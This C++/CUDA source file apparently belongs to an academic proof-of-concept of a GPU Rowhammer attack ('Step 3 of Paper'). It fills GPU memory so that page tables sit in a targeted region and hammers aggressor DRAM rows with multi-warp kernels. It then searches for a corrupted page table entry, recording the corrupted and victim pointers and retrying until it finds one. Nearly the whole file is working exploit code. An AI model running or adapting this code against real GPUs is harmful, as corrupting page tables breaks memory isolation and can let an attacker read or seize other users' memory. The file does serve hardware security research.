#include "./s2_firstRegion.cuh"
#include "./s3_firstRegion_hammer.cuh"
#include <chrono>
#include <cmath>
#include <fstream>
#include <numeric>
#include <algorithm>
#include <rh_impls.cuh>
#include <rh_kernels.cuh>
#include <rh_utils.cuh>
#include <string>
#include <thread>
#include <random>
#include <cmath>

void
first_PT_region_attack_test (int argc, char *argv[])
{
  const uint64_t num_alloc_init = std::stoll (argv[0]);
  const double threshold = std::stod (argv[1]);
  const uint64_t skip = std::stoull (argv[2]);

  uint8_t *temp;
  GPUBreachContext ctx;

  if (!first_PT_region (num_alloc_init, threshold, skip, ctx))
    {
      printf ("Error: First PT Region Allocation is wrong\n");
      exit (1);
    }

  std::cout << std::dec;
  std::cout
      << "Test Step 3:" << "\n"
      << "Filling Memory to Full Again"
      << "\n\n";

  int consec_spike = 0;
  int consec_spike_lim = 5;
  for (uint64_t i = 0; i < num_alloc_init; i += 1)
    {
      cudaMallocManaged (&temp, ALLOC_SIZE);
      double currentMS = time_data_access (temp, ALLOC_SIZE);
      DBG_OUT << i << " New PT time: " << currentMS << ' ' << (void *)temp
              << " ms" << std::endl;

      // Create 64KB Pages to increase chances.
      *temp = 'a';

      if (i < skip)
        continue;

      // Look for consecutive spikes, reset if not.
      consec_spike += currentMS > threshold ? 1 : -consec_spike;
      if (consec_spike == consec_spike_lim)
        {
          std::cout << "Spikes observed after allocation index \033[1;31m"
                    << i - consec_spike_lim + 1
                    << "\033[0m" << std::endl;
          std::cout << "This means you should perform at most \033[1m"
                    << i - consec_spike_lim + 1
                    << "\033[0m number of allocations to avoid eviction"
                    << std::endl;
          std::cout << "Pass \033[1;32m"
                    << i - consec_spike_lim + 1
                    << "\033[0m as the limit in subsequent experiments."
                    << std::endl;
          break;
        }
    }
}

bool
first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, double threshold,
                        uint64_t skip, GPUBreachContext& ctx)
{
  uint8_t *temp;
  if (!first_PT_region (num_alloc_init, threshold, skip, ctx))
    {
      printf ("Error: First PT Region Allocation is wrong\n");
      exit (1);
    }

  auto& agg_vec = ctx.step2_data.agg_vec;
  auto& agg_row_list = ctx.step2_data.agg_row_list;
  ctx.step3_data.agg_ptrs = ctx.step2_data.agg_ptrs;

  std::cout << std::dec;
  std::cout
      << "Start Step 3" << "\n"
      << "Filling Memory to Full Again (Consequently the First PT Region) "
      << "\n\n";

  uint64_t repeats = 0;

  auto& region_ptrs = ctx.step3_data.region_ptrs;
  auto& corrupted_ptr = ctx.step3_data.corrupted_ptr;
  auto& victim_ptr = ctx.step3_data.victim_ptr;
  auto& corrupted_id = ctx.step3_data.corrupted_id;
  auto& victim_id = ctx.step3_data.victim_id;
  region_ptrs = std::vector<uint8_t *> (num_alloc_post_msg);

  /**
   * WARNING: this code is aggresively making all 2MB to 64KB page tables,
   * this will require a lot of CPU RAM.
   * 
   * To conserve RAM usage, you may change the code to only do this on the 
   * first 16 GB. Or even try filling first using 2MB + 4KB or cuMemMap.
   */

  /****************************************************************/
  /* Step 3 of Paper: Repeat Hammer On PTEs til Corruption */
  /****************************************************************/
  bool found_mismatch = false;
  // unsigned seed = std::chrono::system_clock::now().time_since_epoch().count();
  // std::mt19937_64 rng(seed); // Mersenne Twister engine

  // // 2. Define the distribution for the desired range [x, y]
  // std::uniform_int_distribution<int> dist(0, num_alloc_post_msg);

  // // 3. Generate a random number
  // int random_num = dist(rng);
  while (!found_mismatch)
    {
      // On Failure, Re-order and try again
      if (repeats != 0)
        std::rotate (region_ptrs.begin(), region_ptrs.begin() + num_alloc_post_msg - 8,
                     region_ptrs.begin() + num_alloc_post_msg);
        // std::shuffle(region_ptrs, region_ptrs + num_alloc_post_msg, g);
      for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
        {
          if (repeats != 0)
            cudaFree (region_ptrs[i]);
          cudaMallocManaged (&temp, ALLOC_SIZE);
          double currentMS = time_data_access (temp, ALLOC_SIZE);
          DBG_OUT << i << " New PT time: " << currentMS << ' ' << (void *)temp
                  << " ms" << std::endl;

          region_ptrs[i] = temp;

          // if (repeats != 0 && i < 8000)
          if (i < 8000)
            *region_ptrs[i] = 'a';
        }

      // if (repeats == 0)
      // {
      //   std::rotate (region_ptrs, region_ptrs + num_alloc_post_msg - random_num,
      //                region_ptrs + num_alloc_post_msg);
      //   // std::shuffle(region_ptrs, region_ptrs + num_alloc_post_msg, g);
      //   for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
      //   {
      //     cudaFree (region_ptrs[i]);
      //     cudaMallocManaged (&temp, ALLOC_SIZE);
      //     double currentMS = time_data_access (temp, ALLOC_SIZE);
      //     DBG_OUT << i << " New PT time: " << currentMS << ' ' << (void *)temp
      //             << " ms" << std::endl;

      //     region_ptrs[i] = temp;

      //     if (i < 12000)
      //       *region_ptrs[i] = 'a';
      //   }
      // }
      // pause();

      gpuErrchk (cudaPeekAtLastError ());
      std::cout << "First PT Region Filled " << "Round " << repeats
                << " Completed" << '\n';
      repeats++;


      std::cout << "Filling In Identifing Information for Each Page... "
                << '\n';

      std::cout << "Identifing Data Placed, Hammer Starts..." << '\n';

      const uint64_t it = 23000;
      const uint64_t n = 8;
      const uint64_t k = 3;
      const uint64_t delay = 55;
      const uint64_t period = 1;

      for (int j = 0; j < 50; j++)
        uint64_t time = start_multi_warp_hammer (
            agg_row_list, agg_vec, it, n, k, agg_vec.size (), delay, period);

      std::cout << "Hammer Done, Finding Corruption... \033[1;31m(Rare: If taking longer than 5s, CTRL + C and stop the program)\033[0m" << '\n';
      /**
       * For each 64KB, read from cuda. (Change util to write different data to
       * 64KB offset) Find repetition for temp and pair.
       *
       * If not repetition, find if it matches a PTE.
       */ 
      gpuErrchk (cudaPeekAtLastError ());
      for (uint64_t i = 0; !found_mismatch && i < num_alloc_post_msg; i++)
      {
          // Pre-initialize result slots in existing region memory
          uint64_t sentinel = UINT64_MAX;
          memset_ptr<<<1, 1>>>(region_ptrs[i] + 64 * 1024 + 8,  0,     8);
          memset_ptr<<<1, 1>>>(region_ptrs[i] + 64 * 1024 + 16, sentinel, 8);
          memset_ptr<<<1, 1>>>(region_ptrs[i] + 64 * 1024 + 24, 0,     8);
          cudaDeviceSynchronize();

          // Launch inner j loop as kernel
          check_region_inner<<<1, 32>>>(region_ptrs[i], ALLOC_SIZE);
          cudaDeviceSynchronize();

          // Copy results back
          uint64_t found = 0, corrupted_j = 0, victim = 0;
          cudaMemcpy(&found,       region_ptrs[i] + 64 * 1024 + 8,  8, cudaMemcpyDeviceToHost);
          cudaMemcpy(&corrupted_j, region_ptrs[i] + 64 * 1024 + 16, 8, cudaMemcpyDeviceToHost);
          cudaMemcpy(&victim,      region_ptrs[i] + 64 * 1024 + 24, 8, cudaMemcpyDeviceToHost);

          if (found)
          {
              corrupted_ptr  = region_ptrs[i] + corrupted_j;
              corrupted_id   = i;
              victim_ptr     = reinterpret_cast<uint8_t*>(victim);
              found_mismatch = true;
              break;
          }
      }

      if (found_mismatch)
        {
          std::cout << "\nAfter " << repeats << " repeats"<< '\n';
          std::cout << "Corrupted: "
                    << (void *)corrupted_ptr
                    << ". Victim: " << (void *)victim_ptr << '\n';
          break;
        }
      else
        std::cout << "No Corruption Found, Retrying..." << "\n\n";
  
      if (debug_enabled()) paused();
    }


  uint8_t *victim_round_addr
      = (uint8_t *)((uintptr_t)victim_ptr & ~((1UL << 20) - 1));
  for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
    {
      if (region_ptrs[i] == victim_round_addr)
        {
          victim_id = i;
          DBG_OUT << "Found victim id." << '\n';
        }
    }
  if (debug_enabled())
  {
    std::cout << "(Step 3 Done) Found Corrupted PFN Destination: Press "
               "\033[1;32mEnter Key\033[0m to continue..."
            << '\n';
    paused ();
  }
  else
  {
    std::cout << "(Step 3 Done) Found Corrupted PFN Destination\n";
  }
  

  return true;
}

bool
first_PT_region_attack (int argc, char *argv[])
{
  const uint64_t num_alloc_init = std::stoll (argv[0]);
  const uint64_t num_alloc_post_msg = std::stoll (argv[1]);
  const double threshold = std::stod (argv[2]);
  const uint64_t skip = std::stoull (argv[3]);
  GPUBreachContext ctx;

  return first_PT_region_attack (
      num_alloc_init, num_alloc_post_msg, threshold, skip, ctx);
}